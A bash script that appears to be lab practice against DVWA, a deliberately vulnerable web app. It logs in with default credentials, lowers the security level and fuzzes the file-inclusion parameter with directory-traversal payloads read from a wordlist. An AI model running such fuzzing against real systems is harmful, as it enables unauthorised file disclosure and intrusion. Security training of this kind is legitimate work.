#!/bin/bash

TARGET="192.168.122.109"
BASE_URL="http://$TARGET/DVWA"
DVWA_USER="admin"
DVWA_PASS="password"

echo "[*] Authenticating to DVWA..."

# 1. Get initial token
INIT_PAGE=$(curl -s "$BASE_URL/login.php")
USER_TOKEN=$(echo "$INIT_PAGE" | grep -oP '(?<=name="user_token" value=")[^"]*')

# 2. Login and extract PHPSESSID
RAW_COOKIES=$(curl -s -i \
  -d "username=$DVWA_USER&password=$DVWA_PASS&user_token=$USER_TOKEN&Login=Login" \
  "$BASE_URL/login.php" | grep -i "Set-Cookie")

SESSION_ID=$(echo "$RAW_COOKIES" | grep -oP 'PHPSESSID=\K[^;]*')

if [ -z "$SESSION_ID" ]; then
  echo "[!] Login failed. Cannot proceed."
  exit 1
fi

echo "[+] Login successful. Session ID: $SESSION_ID"
COOKIE_STR="security=low; PHPSESSID=$SESSION_ID"

# 3. Set security level to low
curl -s -b "$COOKIE_STR" \
  -d "security=low&seclev_submit=Submit" \
  "$BASE_URL/security.php" >/dev/null

# --- Directory Traversal Fuzzing ---
DT_WORDLIST="directory-traversal.txt"
echo -e "\n[*] Starting Directory Traversal fuzzing..."

if [ ! -f "$DT_WORDLIST" ]; then
    echo "[!] Wordlist file '$DT_WORDLIST' not found."
else
    while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
        # Encode payload to URL format
        ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")

        # Send GET request with encoded payload and session cookie
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
            -b "$COOKIE_STR" \
            "$BASE_URL/vulnerabilities/fi/?page=${ENCODED}")

        echo "[DT] Payload: $PAYLOAD | Status: $RESPONSE"

    done <"$DT_WORDLIST"
    echo "[*] Directory Traversal fuzzing completed."
fi